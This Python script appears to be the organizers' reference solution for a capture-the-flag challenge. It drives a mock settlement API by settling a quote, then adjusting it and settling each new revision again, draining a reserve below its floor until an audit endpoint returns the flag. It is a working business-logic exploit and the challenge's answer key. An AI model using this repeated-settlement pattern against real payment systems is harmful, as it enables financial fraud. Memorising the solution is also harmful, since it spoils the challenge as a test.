#!/usr/bin/env python3
"""
The Solver Race — Reference Solution Verification Script
Organizer Tooling for Automated Challenge Healthcheck & Verification
"""

import sys
import requests

def solve(base_url: str):
    base_url = base_url.rstrip("/")
    session = requests.Session()

    print(f"[*] Target service: {base_url}")

    # 1. Register Solver Account
    reg_url = f"{base_url}/api/account/register"
    res = session.post(reg_url, json={"solver_name": "Apex-Verification-Node"})
    if res.status_code != 200:
        print(f"[-] Registration failed: {res.status_code} {res.text}")
        sys.exit(1)

    account_data = res.json()
    token = account_data["token"]
    account_id = account_data["account_id"]
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    print(f"[+] Provisioned solver channel: {account_id}")
    print(f"[*] Initial reserve: {account_data['reserve_balance']:.2f} CR | Solvency floor: {account_data['solvency_floor']:.2f} CR")

    # 2. Query Orders
    orders_res = session.get(f"{base_url}/api/orders", headers=headers)
    orders = orders_res.json()
    target_order = orders[0]["order_id"]
    print(f"[*] Selected target settlement order: {target_order}")

    # 3. Create Initial Quote
    quote_res = session.post(f"{base_url}/api/quotes", headers=headers, json={
        "order_id": target_order,
        "rate": 1.05,
        "spread_bps": 180,
        "allocation_pct": 100.0
    })
    quote = quote_res.json()
    quote_id = quote["quote_id"]
    active_ref = quote["quote_ref"]
    print(f"[+] Created quote {quote_id} -> Initial revision: {active_ref} (Payout: {quote['payout_amount']:.2f} CR)")

    # 4. Settle Initial Revision
    settle_res = session.post(f"{base_url}/api/settlements", headers=headers, json={
        "quote_ref": active_ref
    })
    settle_data = settle_res.json()
    current_reserve = settle_data["reserve_balance_after"]
    print(f"[+] Settled {active_ref} | Reserve balance: {current_reserve:.2f} CR")

    # 5. Cycle: Adjust Quote -> Settle New Revision (Breaching Solvency Floor)
    cycle = 1
    while current_reserve >= 500.00:
        cycle += 1
        adj_res = session.post(f"{base_url}/api/quotes/{quote_id}/adjust", headers=headers, json={
            "rate_delta": 0.01,
            "spread_delta": 30,
            "allocation_pct": 100.0
        })
        if adj_res.status_code != 200:
            print(f"[-] Quote adjustment failed: {adj_res.text}")
            sys.exit(1)

        adj_data = adj_res.json()
        new_ref = adj_data["quote_ref"]

        settle_res = session.post(f"{base_url}/api/settlements", headers=headers, json={
            "quote_ref": new_ref
        })
        if settle_res.status_code != 200:
            print(f"[-] Settlement of {new_ref} failed: {settle_res.text}")
            sys.exit(1)

        settle_data = settle_res.json()
        current_reserve = settle_data["reserve_balance_after"]
        print(f"[+] Cycle {cycle}: Settled {new_ref} (Payout: {adj_data['payout_amount']:.2f} CR) -> Reserve: {current_reserve:.2f} CR")

    print(f"\n[!] Statutory solvency corridor breached! Current reserve: {current_reserve:.2f} CR < 500.00 CR")

    # 6. Trigger Supervisory Reconciliation Audit
    print("[*] Executing supervisory capital and solvency reconciliation audit...")
    audit_res = session.post(f"{base_url}/api/reconciliation/audit", headers=headers)
    if audit_res.status_code != 200:
        print(f"[-] Audit endpoint failed: {audit_res.text}")
        sys.exit(1)

    audit_data = audit_res.json()
    status_label = audit_data.get("solvency_status")
    certificate = audit_data.get("certificate", {})

    print(f"[+] Reconciliation Status: {status_label}")
    print(f"[+] Certificate ID: {certificate.get('certificate_id')}")
    print(f"[+] Resolution Mandate: {certificate.get('resolution_mandate')}")

    flag = certificate.get("attestation_seal")
    if flag:
        print(f"\n[SUCCESS] Flag extracted: {flag}")
        return flag
    else:
        print("[-] Flag not found in certificate output.")
        sys.exit(1)

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
    solve(url)
